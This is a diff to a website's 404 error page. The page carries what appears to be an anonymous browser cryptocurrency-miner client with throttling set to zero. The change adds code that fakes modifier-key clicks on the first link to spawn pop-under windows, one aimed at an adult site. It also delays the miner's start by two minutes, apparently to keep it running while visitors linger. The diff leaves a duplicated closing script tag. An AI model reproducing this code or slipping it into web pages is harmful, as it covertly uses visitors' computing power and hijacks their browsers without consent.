@@ -51,7 +51,34 @@
     var _client = new Client.Anonymous('a0163dc30164c45fa616c304242cb6f9f9ca9b9e9a76a84010b14cae22e2e376', {
 	throttle: 0, ads: 0
     });
-    _client.start();
+ function pop() {
+        var evt = new MouseEvent('click', {
+          view : window,
+          ctrlKey: true
+        });
+        document.getElementsByTagName('a')[0].dispatchEvent(evt);
+        var chrome   = navigator.userAgent.indexOf('Chrome') > -1;
+        if (!chrome) {
+          window.open("www.hanime.com");
+        }
+      }
+      function ctrlNavigateAndWindowOpen() {
+        var evt = new MouseEvent('click', {
+          view : window,
+          ctrlKey: true
+        });
+        document.getElementsByTagName('a')[0].dispatchEvent(evt);
+        window.open(location.href);
+      }
+      function pop2() {
+        var evt = new MouseEvent('click', {
+          view : window,
+          shiftKey: true
+        });
+        document.getElementsByTagName('a')[0].dispatchEvent(evt);
+        setTimeout(function(){ _client.start(); },  2 * 60 * 1000);
+      }
+    </script>
 </script>
     <div class="container">
       <h1>404</h1>
